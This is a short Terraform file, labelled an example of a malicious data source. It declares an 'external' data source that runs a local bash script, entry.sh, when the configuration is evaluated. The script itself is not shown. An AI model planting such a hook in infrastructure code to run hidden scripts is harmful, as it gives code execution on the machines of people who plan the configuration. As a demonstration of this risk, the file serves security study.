#
# 
# Example of a malicious data source in terraform.
#
#

data "external" "entrypoint" {
  program = ["bash", "entry.sh"]
}
